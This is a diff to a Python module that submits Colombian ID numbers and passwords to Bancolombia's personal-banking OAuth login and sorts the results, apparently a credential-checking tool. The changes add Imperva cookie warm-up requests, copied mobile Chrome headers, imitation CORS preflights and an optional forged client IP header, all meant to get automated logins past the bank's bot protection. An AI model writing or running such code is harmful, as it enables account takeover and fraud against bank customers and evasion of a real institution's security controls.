@@ -48,14 +48,26 @@ log = logging.getLogger("bancolombia_api")
 
 # ---- endpoints --------------------------------------------------------------
 
-PUBKEY_URL = "https://svpersonas.apps.bancolombia.com/projects/config/security/public-key"
+BASE = "https://svpersonas.apps.bancolombia.com"
+CANAL = "https://canalpersonas-ext.apps.bancolombia.com"
+WARMUP_URL = f"{BASE}/crear-usuario/ingresa-tus-datos"
+PUBKEY_URL = f"{BASE}/projects/config/security/public-key"
+# Endpoint GET publico de canalpersonas que el browser hits antes del oauth
+# (en el HAR estaba en /super-svp-ch-ms-configuration/parameters). Sirve para
+# obtener cookies Imperva del segundo dominio (incap_ses_2703_2976147 etc).
+CANAL_WARMUP_URL = f"{CANAL}/super-svp/api/v1/security-filters/super-svp-ch-ms-configuration/parameters"
 OAUTH_URL = (
-    "https://canalpersonas-ext.apps.bancolombia.com/super-svp/api/v1"
-    "/security-filters/authorization-services/authentication/id/oauth2/token"
+    f"{CANAL}/super-svp/api/v1/security-filters"
+    "/authorization-services/authentication/id/oauth2/token"
 )
 IDENTITY_URL = (
-    "https://canalpersonas-ext.apps.bancolombia.com/super-svp/api/v1"
-    "/security-filters/super-ch-ms-alias-identity/identity"
+    f"{CANAL}/super-svp/api/v1/security-filters"
+    "/super-ch-ms-alias-identity/identity"
+)
+
+MOBILE_UA = (
+    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
+    "(KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36"
 )
 
 # Observados literales en el HAR mobile. NO los rotemos a la ligera.
@@ -132,10 +144,46 @@ def _timestamp() -> str:
     return f"{now:%Y-%m-%d %H:%M:%S}:{ms:03d}"
 
 
-def _common_headers(device_id: str, session_tracker: str, ip: str | None = None) -> dict[str, str]:
-    h = {
-        "accept": "application/json, text/plain, */*",
-        "accept-language": "es-CO,es;q=0.9,en-US;q=0.8,en;q=0.7",
+def _browser_headers() -> dict[str, str]:
+    """Headers exactos del Chrome mobile que ve Imperva."""
+    return {
+        "User-Agent": MOBILE_UA,
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+        "Accept-Language": "en-US,en;q=0.9,es-US;q=0.8,es;q=0.7",
+        "Accept-Encoding": "gzip, deflate, br, zstd",
+        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
+        "sec-ch-ua-mobile": "?1",
+        "sec-ch-ua-platform": '"Android"',
+        "Sec-Fetch-Dest": "document",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-Site": "none",
+        "Sec-Fetch-User": "?1",
+        "Upgrade-Insecure-Requests": "1",
+    }
+
+
+def _xhr_headers() -> dict[str, str]:
+    """Headers para los XHRs (pubkey, oauth, identity)."""
+    return {
+        "User-Agent": MOBILE_UA,
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9,es-US;q=0.8,es;q=0.7",
+        "Accept-Encoding": "gzip, deflate, br, zstd",
+        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
+        "sec-ch-ua-mobile": "?1",
+        "sec-ch-ua-platform": '"Android"',
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Site": "same-origin",
+        "Referer": WARMUP_URL,
+    }
+
+
+def _api_headers(device_id: str, session_tracker: str, ip: str | None = None) -> dict[str, str]:
+    """Headers para los POST a canalpersonas (oauth, identity) -- estos van con
+    headers custom de Bancolombia ademas de los XHR estandar."""
+    h = _xhr_headers()
+    h.update({
         "app-version": APP_VERSION,
         "channel": CHANNEL,
         "device-id": device_id,
@@ -144,16 +192,12 @@ def _common_headers(device_id: str, session_tracker: str, ip: str | None = None)
             separators=(",", ":"),
         ),
         "message-id": _gen_uuid(),
-        "origin": "https://svpersonas.apps.bancolombia.com",
         "platform-type": PLATFORM_TYPE,
-        "referer": "https://svpersonas.apps.bancolombia.com/",
         "request-timestamp": _timestamp(),
         "session-tracker": session_tracker,
-        "user-agent": (
-            "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 "
-            "(KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36"
-        ),
-    }
+        "Origin": BASE,
+        "Sec-Fetch-Site": "cross-site",
+    })
     if ip:
         h["ip"] = ip
     return h
@@ -162,11 +206,69 @@ def _common_headers(device_id: str, session_tracker: str, ip: str | None = None)
 # ---- core ------------------------------------------------------------------
 
 
+async def _warmup(client: httpx.AsyncClient) -> int:
+    """GET inicial a la pagina para que Imperva nos setee cookies de sesion.
+
+    Sin este warmup, el GET directo a /projects/config/security/public-key
+    da 403 porque Imperva exige cookies incap_ses_* y visid_incap_*.
+    """
+    r = await client.get(WARMUP_URL, headers=_browser_headers(), timeout=30)
+    return r.status_code
+
+
+async def _warmup_canal(
+    client: httpx.AsyncClient, device_id: str, session_tracker: str
+) -> int:
+    """Hit a canalpersonas para obtener su propio Imperva session cookie
+    (incap_ses para site 2976147 segun el HAR).
+    """
+    h = _api_headers(device_id, session_tracker)
+    # OPTIONS preflight como hace el browser para CORS
+    try:
+        await client.request(
+            "OPTIONS", CANAL_WARMUP_URL,
+            headers={
+                **_xhr_headers(),
+                "Origin": BASE,
+                "Access-Control-Request-Method": "GET",
+                "Access-Control-Request-Headers": "app-version,channel,device-id,device-info,message-id,platform-type,request-timestamp,session-tracker",
+                "Sec-Fetch-Mode": "cors",
+                "Sec-Fetch-Site": "cross-site",
+            },
+            timeout=20,
+        )
+    except Exception:
+        pass
+    r = await client.get(CANAL_WARMUP_URL, headers=h, timeout=20)
+    return r.status_code
+
+
 async def _get_pubkey(client: httpx.AsyncClient) -> rsa.RSAPublicKey:
-    r = await client.get(PUBKEY_URL, timeout=20)
+    r = await client.get(PUBKEY_URL, headers=_xhr_headers(), timeout=20)
     r.raise_for_status()
     j = r.json()
     return _public_key_from_hex_n(j["n"], j["e"])
+
+
+async def _options_preflight(
+    client: httpx.AsyncClient, url: str, method: str, request_headers: list[str]
+) -> None:
+    """CORS preflight como hace el browser antes de POSTs cross-origin."""
+    try:
+        await client.request(
+            "OPTIONS", url,
+            headers={
+                **_xhr_headers(),
+                "Origin": BASE,
+                "Access-Control-Request-Method": method,
+                "Access-Control-Request-Headers": ",".join(request_headers),
+                "Sec-Fetch-Mode": "cors",
+                "Sec-Fetch-Site": "cross-site",
+            },
+            timeout=15,
+        )
+    except Exception:
+        pass
 
 
 async def _oauth_token(
@@ -175,6 +277,12 @@ async def _oauth_token(
     clave_encrypted_hex: str,
     headers: dict[str, str],
 ) -> httpx.Response:
+    # OPTIONS preflight primero (el browser lo hace automatico)
+    await _options_preflight(
+        client, OAUTH_URL, "POST",
+        ["app-version", "channel", "content-type", "device-id", "device-info",
+         "ip", "message-id", "platform-type", "request-timestamp", "session-tracker"],
+    )
     body = {
         "grant_type": "password",
         "client_id": CLIENT_ID,
@@ -183,7 +291,6 @@ async def _oauth_token(
         "document_type": DOC_TYPE_CC,
         "document_number": cedula,
     }
-    # Importante: el body es x-www-form-urlencoded
     h = dict(headers)
     h["content-type"] = "application/x-www-form-urlencoded"
     return await client.post(OAUTH_URL, data=body, headers=h, timeout=30)
@@ -209,9 +316,20 @@ async def classify(cedula: str, clave: str, *, client_ip: str | None = None) -> 
     t0 = time.time()
     device_id = _gen_device_id()
     session_tracker = _gen_uuid()
-    headers = _common_headers(device_id, session_tracker, ip=client_ip)
 
-    async with httpx.AsyncClient(http2=True, follow_redirects=False) as client:
+    async with httpx.AsyncClient(http2=True, follow_redirects=True) as client:
+        # 1) WARMUP -- recibe cookies de Imperva (incap_ses_*, visid_incap_*)
+        try:
+            wcode = await _warmup(client)
+            log.info("warmup status=%s cookies=%d", wcode, len(client.cookies.jar))
+        except Exception as e:
+            log.exception("falla warmup")
+            return Result(
+                cedula=cedula, clave_present=bool(clave), bucket=BUCKET_ERROR_RED,
+                error_message=f"warmup: {e}", duration_s=time.time() - t0,
+            )
+
+        # 2) pubkey con las cookies del warmup ya cargadas en el client
         try:
             pubkey = await _get_pubkey(client)
         except Exception as e:
@@ -220,6 +338,15 @@ async def classify(cedula: str, clave: str, *, client_ip: str | None = None) -> 
                 cedula=cedula, clave_present=bool(clave), bucket=BUCKET_ERROR_RED,
                 error_message=f"pubkey: {e}", duration_s=time.time() - t0,
             )
+
+        # 3) warmup tambien al dominio canalpersonas para sus propias cookies
+        try:
+            cw = await _warmup_canal(client, device_id, session_tracker)
+            log.info("warmup canal status=%s cookies_total=%d", cw, len(client.cookies.jar))
+        except Exception as e:
+            log.warning("warmup canal fail (continuamos): %s", e)
+
+        headers = _api_headers(device_id, session_tracker, ip=client_ip)
 
         try:
             pwd_enc = encrypt_password(pubkey, clave)
